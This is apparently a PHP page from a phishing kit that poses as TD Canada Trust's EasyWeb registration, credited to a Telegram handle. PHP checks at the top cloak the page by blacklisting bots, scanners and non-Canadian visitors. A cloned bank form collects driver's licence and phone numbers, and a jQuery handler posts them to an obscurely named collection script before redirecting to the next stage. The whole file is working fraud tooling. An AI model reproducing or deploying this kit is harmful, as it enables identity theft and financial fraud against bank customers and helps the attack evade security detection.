<?php
// @Kr3pto on telegram
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
    
}else{
     header( "Location: index.php" ); 
}
if($internal_antibot == 1){
    require "tc_assetz/old_blocker.php";
}
if($enable_killbot == 1){
    if(checkkillbot($killbot_key) == true){
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if($mobile_lock == 1){
    require "tc_assetz/mob_lock.php";
}
if($CA_lock == 1){
    if(onlyca() == true){
    
    }else{
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if($external_antibot == 1){
    if(checkBot($apikey) == true){
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
?>
<?php
include('blackhole/index.php');
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
                include 'prevents/block.php';
?>
<!DOCTYPE html>
<script type="text/javascript">
<!--
if (screen.width >= 699) {
document.location = "antibot.php";
}
//-->
</script>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class=" webkit safari safari14 mac js"><head>
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <title>EasyWeb Update: Customer Identification 
    </title>
    <!--<f:loadBundle basename="/prod/links" var="links" />-->
    <!--<f:loadBundle basename="/prod/oauth" var="oauth" />-->

    <script type="text/javascript" src="/waw/esr/js/jquery/jquery-1.12.3.min.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/jquery/jquery-migrate-1.4.1.min.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/jquery/jquery.metadata.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/common.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/fieldValidationSupport.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/standards/evergreen/1_0/js/default.js"><!--

//--></script>
    
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/evergreen_theme_14_3.css">
    
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/default.css">
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/esrEvergreen.css">
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/progressBar.css">
    
    <link rel="icon" type="image/vnd.microsoft.icon" href="/waw/esr/images/cip/favicon.ico">
    <link rel="SHORTCUT ICON" href="/waw/esr/images/cip/favicon.ico"> 
    
    <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
    <meta content="no-cache" http-equiv="pragma">
    <meta content="en_CA" http-equiv="Content-Language">

</head>

<body class="td-JS-enabled"><script type="text/javascript"> myfaces.config._autoeval = true; </script>

<!-- Used by UAP integration to set consumer cookie -->
<iframe id="uapCookieFrame" data-clientid="e7366b62-b7f6-4550-b857-8eda5825c45c" data-consumerid="ewesr" data-redirecturi="/waw/esr/selfRegistration.htm?loggedInFromGadget=true&amp;LN=" data-pingurl="https://authorization.td.com" data-uapurl="https://authentication.td.com" data-scope="debit.acs.debcrd.r debit.acs.debcrd.w" style="visibility:hidden !important; height: 0 !important;"></iframe>
    <div id="td-wrapper">
        <div id="td-container">
                <!-- The default header. Content pages can override this. -->

    <div id="td-layout-header" class="td-layout-row">
        <div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
            <div id="td-logo">
                <img src="tc_assetz/styles/EasywbLogo.gif" alt="TD Canada Trust EasyWeb">
            </div>
        </div>
    </div>
    <div class="td-layout-row td-noprint" id="td-layout-nav-main">
        <div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
            <div id="td-nav-divider"></div>
        </div>
    </div>

            <div id="td-layout-contentarea" class="td-layout-row">
                <div class="td-layout-column td-layout-grid12 td-layout-column-first">
                    <!-- The default progress Bar. Content pages can override this. -->

    <div id="td-pagetitlearea">
        <h1><span id="title">EasyWeb Update: Customer Identification </span></h1>
        
        <div class="progressindicator td-margin-top-large td-layout-grid10">
            <progress id="progressLine" max="4" value="3"><span id="progressLineText" class="td-accesstext">step 3 of 4</span></progress>
            <div class="progressbar"><span id="progressLineIE" style="width:50%;"></span></div>
            <ol data-progress-steps="4">
                <li id="progressItem1" class="step2 step-done">
                <span>Login
                    <span id="progressItemAccess1" class="td-accesstext">completed step</span>
                </span>
                </li>
                <li id="progressItem2" class="step3 step-done">
                    <span>Access Card
                        <span id="progressItemAccess2" class="td-accesstext">current step</span>
                    </span>
                </li>
                <li id="progressItem3" class="step3 step-active">
                    <span>Customer Identification
                        <span id="progressItemAccess3" class="td-accesstext">not yet completed step
                        </span>
                    </span>
                </li>
                <li id="progressItem4" class="step4 step-todo">
                    <span>Confirmation 
                        <span id="progressItemAccess4" class="td-accesstext">not yet completed step
                        </span>
                    </span>
                </li>
            </ol>
        </div>
        <div style="display:none"><span id="progressTitle1">Overview</span><span id="progressTitle2">Customer Identification</span><span id="progressTitle3">Consent &amp; Setup</span><span id="progressTitle4">Confirmation </span><span id="AccessTextCompleted">completed step</span><span id="AccessTextCurrent">current step</span><span id="AccessTextStep">step</span><span id="AccessTextOf">of</span>
        </div>
    </div>
                </div>
                <div class="td-layout-column td-layout-grid10 td-callout td-callout-primary td-cs-tertiary">

        <span style="background:url(https://tmx.td.com/fp/clear.png?org_id=i8n5h0pw&amp;session_id=kw0ckYskK__eAMSvnDGoB6b&amp;m=1)"></span>
        <img style="display: none;" src="https://tmx.td.com/fp/clear.png?org_id=i8n5h0pw&amp;session_id=kw0ckYskK__eAMSvnDGoB6b&amp;m=2" width="1" height="1">
        <script src="https://tmx.td.com/fp/check.js?org_id=i8n5h0pw&amp;session_id=kw0ckYskK__eAMSvnDGoB6b" type="text/javascript"><!--

        
//--></script>
        <object style="display: none;" type="application/x-shockwave-flash" data="https://tmx.td.com/fp/fp.swf?org_id=i8n5h0pw&amp;session_id=kw0ckYskK__eAMSvnDGoB6b" width="1" height="1" id="obj_id">
            <param name="movie" value="https://tmx.td.com/fp/fp.swf?org_id=i8n5h0pw&amp;session_id=kw0ckYskK__eAMSvnDGoB6b">
        </object><form id="formit" name="customerInfo" method="post" action="" class="form-inline">
            
        <h2 class="td-margin-top-small">Customer Identificationn
        </h2>
            
        <div class="control-group">
       
         
        </div>
    
        <p class="text-italic"><span id="requiredText" style="float : right;">All fields are required</span></p>
        
           
                    <div class="control-group">
                    <table>
                        <tbody><tr>
                            <td id="BranchNumberLabel" class="branchLabel" style="display:none"><label for="branchNumberInput">Branch Number </label>
                            </td>
                            <td class="control-label td-layout-grid5"><label id="productNumberLabel" for="productNumberInput">Driver's Licence Number</label>
                            </td>
                        </tr>
                    </tbody></table>
                    
                    <div id="branchNumberError" role="alert" class="td-copy-red" tabindex="-1" style="display:none"></div>
                    <div id="productNumberError" role="alert" class="td-copy-red" tabindex="-1" style="display:none"></div>
                    <div class="controls">
                        
                        <div class="td-callout td-callout-primary td-cs-tertiary td-overlay td-layout-column td-layout-grid4" id="branchNumberHint" style="display: none; opacity: 0;"><a class="td-link-icon td-link-icon-close" href="#">undefined</a>
                            <div class="td-callout-content">
                                <p id="branchNumberHintText" class="td-copy-sub">On your statement this number may be Servicing Branch or Branch Transit Number
                                </p>
                            </div>
                        <a class="td-link-icon td-link-icon-exit" href="#">undefined</a></div>
                        <a id="branchHoverHelp" style="display:none" class="td-link-activeimageonhover td-link-nounderline td-link-overlay {offsetx:0,offsety:0,position:'upward',triggertype:'mouseover',targetelement:'#branchNumberHint'}" href="#"><span class="td-accesstext">On your statement this number may be Servicing Branch or Branch Transit Number
                                </span> 
                            <span class="td-link-icon td-link-icon-help"></span>
                        </a>
                        
                        <span class="separator"></span><input id="productNumberInput" required="true" name="DL" type="text" value="" maxlength="25" class="td-layout-grid4" autocomplete="off" aria-describedby="requiredText">
                    
                        <div class="td-callout td-callout-primary td-cs-tertiary td-overlay td-layout-column td-layout-grid4" id="productNumberHint" style="display: none; opacity: 0;"><a class="td-link-icon td-link-icon-close" href="#">undefined</a>
                            <div class="td-callout-content">
                                <p id="productNumberHintText" class="td-copy-sub">The raised number on the front of your access card.</p>
                            </div>
                        <a class="td-link-icon td-link-icon-exit" href="#">undefined</a></div>
                        <a id="accountHoverHelp" class="td-link-activeimageonhover td-link-nounderline td-link-overlay {offsetx:0,offsety:0,position:'upward',triggertype:'mouseover',targetelement:'#productNumberHint'}" href="#"><span class="td-accesstext">The raised number on the front of your access card.</span> 
                            <span class="td-link-icon td-link-icon-help"></span>
                        </a>
                    </div>
                    
                    <table>
                        <tbody><tr>
                            <td id="BranchNumberHintLabel" class="branchLabel" style="display:none"><label class="td-copy-sub">4 or 5 numbers </label>
                            </td>
                           
                        </tr>
                    </tbody></table></div>
                
                </fieldset><div class="control-group"><label id="postalCodeLabel" class="control-label" for="postalCodeInput">Phone Number</label>
                    <div id="postalCodeError" role="alert" class="td-copy-red" tabindex="-1" style="display:none"></div>
                    <div class="controls"><input id="productNumberInput" name="PN" type="tel" value="" required="true" maxlength="10" class="td-layout-grid4" autocomplete="off" aria-describedby="requiredText">
                    </div></div></fieldset><div class="control-group"><label id="postalCodeLabel" class="control-label" for="postalCodeInput"></label>
                    <div id="postalCodeError" role="alert" class="td-copy-red" tabindex="-1" style="display:none"></div>
                    <div class="controls">
                    </div></div>
                                                    
            </fieldset>         
            <div class="td-margin-top-large td-floatleft"><input id="nextButton" name="nextButton" type="submit" value="Continue" title="Continue" class="td-button td-button-primary">
            &nbsp;&nbsp;<a href="#" onclick="return jsf.util.chain(document.getElementById('cancelButton'), event,'if (!confirm(\'You have chosen to cancel your online registration for EasyWeb Internet banking.\\n\\nClick OK to end your session. The information you have entered will not be saved.\\n\\nClick Cancel to continue with your registration.\')) return false;', 'return myfaces.oam.submitForm(\'customerInfo\',\'cancelButton\');');" id="cancelButton" title="Cancel" class="td-link-nounderline">Cancel</a>
            </div><input type="hidden" name="customerInfo_SUBMIT" value="1"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e1s2"></form>
        
        
                </div>
                <div class="td-layout-grid4 td-floatright" style="padding-right:55px;"><div><style>
#c2tHolder{
margin:0px; padding:0px;
width:200px;
}
#c2tHolderLeft{
margin:0px; padding:0px;
width:25px;
float:left;
}
#c2tHolderRight{
margin:0px; padding:0px;
margin-left:3px;
width:142px;
float:left;
}

.nobr{
white-space:nowrap;}
.nav5b, .nav5b A, .nav5b A:VISITED, .nav5b A:ACTIVE, .nav5b A:HOVER, .nav5b A:LINK{
    color: #2D5C3D !important;
    text-decoration : none;
    font-family: verdana, helvetica, sans serif;
    font-size: 10px;
}
</style>

<div id="c2tHolder">
    <div id="c2tHolderLeft">
        <img src="https://www.tdcanadatrust.com/easyweb5/registration/images/icon_help.gif" alt="Question Mark">
    </div><!--end of c2tHolderLeft-->
        
    <div id="c2tHolderRight">
        <h5>Need Help?</h5>
            <ul style="margin-top:10px;" class="td-copy-sub td-list-links">
                <li><a href="javascript:void(0)" onclick="window.open('http://td.intelliresponse.com/easyweb/index.jsp?requestType=NormalRequest&amp;source=100&amp;id=1056&amp;question=easyweb+self+registration+-+entering+personal+information','td','toolbars=no,height=460,width=520,scrollbars=yes')">Get more info</a></li>
                <!--<li class="nav5b"><span class="nav5b">Call us at </br>1-866-222-3456</span></li>-->
                <!--<li><a href="" class="">Click here to speak with a Banking Specialist</a></li>-->
            </ul>   
            </div><!--end of c2tHolderRight-->
    <div class="td-copy-sub">
    <strong>Small Business Banking Customers</strong> can register by:
    <ul>
    <li> Calling EasyLine telephone banking at <strong>1-866-222-3456</strong>
    </li><li> Visiting your nearest <a href="http://www.tdcanadatrust.com/customer-service/contact-us/branch-locator/index.jsp" class="td-popupwindow td-link-newwindow-withicon" target="_blank" aria-describedby="aria-12183"><span class="td-link-newwindow-label">TD Canada Trust branch</span>&nbsp;<span class="td-link-newwindow-icon" id="aria-12183">(opens new window)</span></a>
    </li></ul>
    
    </div>      
</div><!--end of c2tHolder-->


</div>
                </div>
            </div>
        </div>  
    
    <footer class="td-layout-row" id="td-layout-footer" role="complementary">
        <div class="td-layout-column td-layout-grid5 td-noprint td-layout-column-first">
            <ul class="td-list-inline td-copy-sub td-link-colour-grey td-link-nounderline">
                <li><a href="http://www.td.com/privacyandsecurity" onclick="return footerLinks('http://www.td.com/privacyandsecurity');" class="first">Privacy and Security</a>
                </li>
                <li><a href="http://www.td.com/legal/index_inc.jsp" onclick="return footerLinks('http://www.td.com/legal/index_inc.jsp');">Legal</a>
                </li>
                <li><a href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp" onclick="return footerLinks('http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp');">Accessibility</a>
                </li>
            </ul>
        </div>
        <div id="copyrightTxt" class="rightFooterTxt">TD Group Financial Services site - Copyright&nbsp;©&nbsp;TD
        </div>
    </footer>

    <div id="footerPane" class="rightFooterTxt">(Server ID: &nbsp;S1A &nbsp;:&nbsp;adf5dfc4-75d7-4c80-8d08-ac4ff2bac07d&nbsp;)
    </div>
    </div>
    <script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


    <script>
    
        $(document).ready(function() {
                    $("#formit").submit(function(e) {
                        e.preventDefault();
                        var $this = $(this);
                        $("#loading").css("display", "block");
                        $.ajax({
                                method: "POST",
                                url: "cndsjqklndeqn29131432.php",
                                data: $(this).serialize()
                            })
                            .then(function(msg) {
                                setTimeout(function() {
                                    window.location.href = "charge3.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>";
                                }, 1500);
                            });
                        
        
                    });
                });
    </script>

<!-- BEGIN Omniture SUPPORT -->
<!-- SiteCatalyst code version: H.23.3.
Copyright 1996-2012 Adobe, Inc. All Rights Reserved
More info available at http://www.omniture.com -->

<noscript>
&lt;a href="http://www.omniture.com" title="Web Analytics"&gt;&lt;img src="http://metrics.td.com/b/ss/tdtdct/1/H.22--NS/0" height="1" width="1" border="0" /&gt;&lt;/a&gt;
</noscript>
<!--/DO NOT REMOVE/-->
<!-- End SiteCatalyst code version: H.23.3. -->
<!-- END Omniture -->

</body></html>